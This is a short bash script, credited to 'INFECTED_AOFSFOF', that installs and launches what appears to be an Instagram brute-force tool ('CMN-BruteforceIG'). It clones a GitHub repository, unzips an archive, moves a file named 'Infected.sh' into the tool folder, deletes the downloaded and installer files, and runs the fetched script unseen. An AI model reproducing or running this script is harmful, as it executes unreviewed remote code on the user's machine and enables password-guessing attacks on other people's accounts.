#!/bin/bash
#version 3.0
#HAK CIPTA MILIK INFECTED_AOFSFOF

git clone https://github.com/Infected14741/u.git
clear
cd u
unzip u.zip
clear
cd u
mv Infected.sh /$HOME/CMN-BruteforceIG
cd 
cd CMN-BruteforceIG
rm -rf u
rm -rf AOFSFOF.sh
sh Infected.sh